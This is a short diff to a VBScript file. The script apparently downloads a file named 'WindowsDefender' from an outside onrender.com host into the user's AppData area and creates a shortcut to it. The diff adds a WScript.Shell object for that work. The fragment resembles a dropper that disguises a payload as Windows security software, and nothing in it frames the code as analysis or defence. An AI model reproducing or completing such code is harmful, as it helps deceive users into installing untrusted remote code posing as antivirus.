@@ -1,5 +1,6 @@
 appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
 Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject")
+Dim WshShell : Set WshShell = CreateObject("WScript.Shell")
 
 ' DownloadFile variables
 Dim downloadURL : downloadURL = "https://vibescope.onrender.com/WindowsDefender" ' Replace with your actual download URL
@@ -148,3 +149,4 @@ Set destinationDirectory = Nothing
 Set shortcutFileName = Nothing
 Set shortcutPath = Nothing
 Set scriptPath = Nothing
+Set WshShell = Nothing
